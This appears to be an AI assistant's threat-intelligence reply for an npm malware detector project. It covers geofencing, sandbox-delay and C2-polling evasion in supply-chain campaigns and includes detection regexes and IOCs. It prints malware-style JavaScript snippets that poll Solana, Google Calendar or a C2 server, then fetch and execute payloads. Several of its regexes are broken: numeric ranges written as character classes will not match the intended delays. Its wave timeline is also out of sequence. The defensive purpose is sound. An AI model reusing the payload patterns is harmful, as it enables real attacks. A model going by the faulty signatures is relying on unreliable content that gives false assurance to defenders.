Based on my research into recent npm supply chain attacks, I can provide you with detailed intelligence on the three evasion techniques you're tracking. This information is current as of March 2026.

---

## **1. TIMEZONE/LOCALE CHECKS TO SKIP RUSSIAN SYSTEMS**

### **Signature & Implementation**

This is a well-documented geofencing technique used across multiple campaigns including **GlassWorm**, **PhantomRaven**, and **SANDWORM_MODE** [[155]].

**Code Pattern:**
```javascript
function _isRussianSystem() {
  const locale = Intl.DateTimeFormat().resolvedOptions().locale;
  if (locale.includes('ru-RU')) return true;

  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  if (timezone.includes('Europe/Moscow')) return true;
  
  // Additional checks may include:
  // - Keyboard layout detection
  // - System language environment variables
  // - Currency format checks
  
  return false;
}

if (_isRussianSystem()) {
  process.exit(0); // Exit without executing malicious payload
}
```

**Detection Signatures for glassworks:**

| Indicator | Pattern | Severity |
|-----------|---------|----------|
| Locale Check | `Intl.DateTimeFormat().resolvedOptions().locale` | HIGH |
| Timezone Check | `Intl.DateTimeFormat().resolvedOptions().timeZone` | HIGH |
| Russian Locale | `ru-RU`, `ru`, `Russian` | CRITICAL |
| Moscow Timezone | `Europe/Moscow`, `Europe/Kaliningrad`, `Europe/Volgograd` | CRITICAL |
| Early Exit | `process.exit(0)` after locale check | CRITICAL |

**Campaigns Using This:**
- **GlassWorm** (October 2025 - March 2026): All variants [[155]]
- **PhantomRaven** (August 2025 - February 2026): Waves 1-4 [[88]]
- **SANDWORM_MODE** (February 2026): 12 hardcoded timezone checks [[187]]

**Attribution Indicator:** This pattern strongly suggests Eastern European cybercriminal origin, as operators deliberately avoid domestic targeting to reduce prosecution risk [[155]].

---

## **2. 15-MINUTE DELAY FOR SANDBOX EVASION**

### **Signature & Implementation**

While I found extensive documentation of **time-gate delays**, the specific 15-minute (900,000ms) pattern appears in multiple contexts. More recent campaigns use **48-96 hour delays** for developer machines while bypassing in CI environments [[217]].

**Code Pattern (Classic 15-minute):**
```javascript
// Sandbox evasion - wait for analysis timeout
setTimeout(() => {
  // Execute Stage 2 payload after sandbox timeout
  executeMaliciousPayload();
}, 900000); // 15 minutes = 900,000 milliseconds
```

**Code Pattern (Modern 48-hour with CI bypass):**
```javascript
// SANDWORM_MODE implementation
const isCI = process.env.CI || 
             process.env.GITHUB_ACTIONS || 
             process.env.CIRCLECI ||
             process.env.TRAVIS;

if (!isCI) {
  // Developer machine: 48-96 hour delay with jitter
  const delay = 48 * 60 * 60 * 1000 + Math.random() * 48 * 60 * 60 * 1000;
  setTimeout(executeStage2, delay);
} else {
  // CI/CD: Execute immediately
  executeStage2();
}
```

**Detection Signatures for glassworks:**

| Indicator | Pattern | Severity |
|-----------|---------|----------|
| Long setTimeout | `setTimeout(.*, [540000-345600000])` | HIGH |
| 15-minute exact | `900000`, `15 * 60 * 1000` | CRITICAL |
| 48-hour delay | `48 * 60 * 60 * 1000`, `172800000` | CRITICAL |
| CI Environment Check | `process.env.CI`, `GITHUB_ACTIONS` | MEDIUM |
| Conditional Delay | `if (!isCI) setTimeout` | CRITICAL |

**Campaigns Using This:**
- **SANDWORM_MODE**: 48-hour time gate with host-derived jitter [[185]]
- **Shai-Hulud V2**: Preinstall execution with CI-aware delays [[141]]
- **GlassWorm**: Variable delays based on environment detection [[130]]

---

## **3. HIBERNATION & POLLING FOR TRIGGER EVENTS**

### **Signature & Implementation**

This is where the most sophisticated recent attacks show innovation. **GlassWorm** uses **blockchain-based C2** with **5-second polling intervals** [[155]].

**Code Pattern (Solana Blockchain C2):**
```javascript
const SOLANA_RPC = "https://api.mainnet-beta.solana.com";
const C2_ADDRESS = "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC";

// Poll blockchain every 5 seconds for new transaction memos
setInterval(async () => {
  const memo = await getLatestMemo(C2_ADDRESS);
  if (memo) {
    const c2Url = JSON.parse(atob(memo)).link;
    const payload = await fetch(c2Url);
    executePayload(payload);
  }
}, 5000); // 5-second polling interval
```

**Code Pattern (Traditional HTTP Beaconing):**
```javascript
// C2 beaconing with jitter
function beacon() {
  const interval = 30000 + Math.random() * 60000; // 30-90 seconds
  setTimeout(async () => {
    try {
      await fetch(C2_SERVER, {
        method: 'POST',
        headers: { 'X-Request-ID': generateUUID() }
      });
    } catch (e) {
      // Silent failure - continue polling
    }
    beacon();
  }, interval);
}
beacon();
```

**Code Pattern (Google Calendar C2 Backup):**
```javascript
// GlassWorm backup C2 mechanism
const CALENDAR_URL = "https://calendar.app.google/M2ZCvM8ULL56PD1d6";

setInterval(async () => {
  const calendar = await fetch(CALENDAR_URL);
  const event = await parseCalendarEvent(calendar);
  const c2Url = atob(event.title); // Base64-encoded URL in event title
  // ... fetch and execute payload
}, 300000); // 5-minute interval for backup C2
```

**Detection Signatures for glassworks:**

| Indicator | Pattern | Severity |
|-----------|---------|----------|
| Short Interval Polling | `setInterval(.*, [1000-10000])` | HIGH |
| 5-second Poll | `5000`, `5 * 1000` | CRITICAL |
| Solana RPC | `api.mainnet-beta.solana.com` | CRITICAL |
| Blockchain Address | 32-44 char base58 Solana addresses | CRITICAL |
| Calendar C2 | `calendar.app.google` | CRITICAL |
| Memo Parsing | `getSignaturesForAddress`, `getTransaction` | HIGH |
| Silent Fetch Failures | `try { fetch } catch {}` in loop | MEDIUM |

**Campaigns Using This:**
- **GlassWorm**: 5-second Solana polling + Google Calendar backup [[155]]
- **PhantomRaven**: HTTP GET → POST → WebSocket fallback chain [[88]]
- **SANDWORM_MODE**: DNS tunneling with DGA + GitHub API exfil [[185]]

---

## **THE 5 WAVES - COMPLETE TIMELINE**

Based on the intelligence gathered, here are the **5 major npm supply chain attack waves** from 2025-2026:

| Wave | Campaign | Timeline | Packages | Key Innovation |
|------|----------|----------|----------|----------------|
| **1** | **Shai-Hulud V1** | Sept 8-18, 2025 | ~180 packages | Self-propagating worm via npm tokens [[95]] |
| **2** | **PhantomRaven Wave 1** | Aug-Oct 2025 | 126 packages | Remote Dynamic Dependencies (RDD) [[89]] |
| **3** | **Shai-Hulud V2** | Nov 24-25, 2025 | 700+ packages | Preinstall execution + Bun runtime [[141]] |
| **4** | **PhantomRaven Waves 2-4** | Nov 2025-Feb 2026 | 88 packages | Slopsquatting (AI-suggested names) [[88]] |
| **5** | **GlassWorm/SANDWORM_MODE** | Oct 2025-Mar 2026 | 400+ repos | Blockchain C2 + MCP injection [[185]] |

**Additional Active Campaigns (Parallel Waves):**
- **GlassWorm V2** (March 16, 2026): React Native packages, 134K monthly downloads [[190]]
- **SANDWORM_MODE** (February 2026): 19 typosquatted packages, AI toolchain poisoning [[185]]

---

## **CREATIVE IDEAS FOR GLASSWORKS ENHANCEMENT**

Given your current glassworks architecture, here are specific enhancements based on the intelligence:

### **1. Add Geofencing Detection Module (GW009)**
```rust
// New detection category for your semantic analyzer
pub enum DetectionCategory {
    // ... existing
    RussianLocaleCheck,      // NEW
    TimezoneGeofencing,      // NEW
    CIEnvironmentDetection,  // NEW
}
```

**Regex Patterns to Add:**
```rust
// Locale/timezone checks
const RUSSIAN_LOCALE_PATTERNS: &[&str] = &[
    r"Intl\.DateTimeFormat\(\)\.resolvedOptions\(\)\.locale",
    r"Intl\.DateTimeFormat\(\)\.resolvedOptions\(\)\.timeZone",
    r"ru-RU|Europe/Moscow|Europe/Kaliningrad",
    r"process\.exit\(0\).*locale",
];
```

### **2. Time-Delay Detection (GW010)**
```rust
// Detect suspicious setTimeout/setInterval patterns
const DELAY_PATTERNS: &[&str] = &[
    r"setTimeout\(.*,\s*[540000-345600000]\)",  // 15min to 96hrs
    r"900000|172800000|259200000",  // Specific millisecond values
    r"process\.env\.CI.*setTimeout",  // CI bypass pattern
];
```

### **3. C2 Polling Detection (GW011)**
```rust
// Blockchain and beaconing detection
const C2_POLLING_PATTERNS: &[&str] = &[
    r"setInterval\(.*,\s*[1000-10000]\)",  // Short intervals
    r"api\.mainnet-beta\.solana\.com",
    r"getSignaturesForAddress|getTransaction",
    r"calendar\.app\.google",
    r"BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC",  // GlassWorm C2
];
```

### **4. LLM Analysis Prompts for Evasion Detection**
Add these to your LLM analysis layer:
```
"Analyze this code for sandbox evasion techniques including:
1. Locale/timezone checks that exit early
2. setTimeout/setInterval delays over 5 minutes
3. CI/CD environment detection with conditional execution
4. Blockchain or external service polling for C2
5. Silent error handling in network request loops"
```

### **5. Campaign Correlation Engine**
Build a module that correlates findings across the 5 waves:
```python
# harness/campaign_correlator.py
CAMPAIGN_SIGNATURES = {
    "GlassWorm": {
        "solana_address": "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC",
        "c2_polling_interval": 5000,
        "locale_check": True,
        "unicode_stego": True
    },
    "SANDWORM_MODE": {
        "time_gate_hours": 48,
        "mcp_injection": True,
        "dns_exfil": True,
        "typoquat_pattern": "claude-code|supports-color"
    },
    # ... etc
}
```

### **6. Real-Time Threat Feed Integration**
Consider integrating with:
- **Socket.dev Malware Feed** (2-5 minute detection latency) [[185]]
- **Endor Labs Malware Feed** (real-time campaign tracking) [[88]]
- **Koi Security Wings Engine** (behavioral monitoring) [[89]]

---

## **IMMEDIATE ACTIONABLE IOCs**

**Infrastructure to Block:**
```
# GlassWorm C2
217.69.3.218
199.247.10.166
140.82.52.31:80/wall
45.32.150.251

# PhantomRaven C2
packages.storeartifact.com
npm.jpartifacts.com
package.storeartifacts.com
npm.artifactsnpm.com
54.173.15.59:8080

# Solana C2 Address
BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC
```

**File System Artifacts to Hunt:**
```
~/.dev-utils/          # SANDWORM_MODE MCP server
~/.git-templates/      # SANDWORM_MODE persistence
/dev/shm/.node_*.js    # SANDWORM_MODE transient Stage 2
%APPDATA%\_node\_x86   # GlassWorm Node runtime
%APPDATA%\_node\_x64   # GlassWorm Node runtime
~init.json             # GlassWorm guard file
```

**GitHub Workflow Names to Audit:**
```
.github/workflows/ci.yml
.github/workflows/test.yml
.github/workflows/discussion.yaml  # Shai-Hulud backdoor
```

---

## **RECOMMENDED NEXT STEPS FOR GLASSWORKS**

1. **Add the 3 new detection modules** (GW009-011) to your semantic analyzer
2. **Update your test corpus** with the 38+ fixtures from recent campaigns [[README]]
3. **Integrate blockchain C2 detection** into your LLM analysis layer
4. **Build campaign correlation** to identify which wave a finding belongs to
5. **Add SARIF output** for GitHub Advanced Security integration (you already have this!)
6. **Consider npm registry scanning** via your Python harness for proactive detection

Your glassworks project is already well-positioned with OXC semantic analysis, LLM integration, and steganography detection. Adding these evasion-pattern signatures will make it comprehensive against the current threat landscape.

Would you like me to help draft specific Rust code for any of these detection modules, or search for additional intelligence on specific campaign TTPs?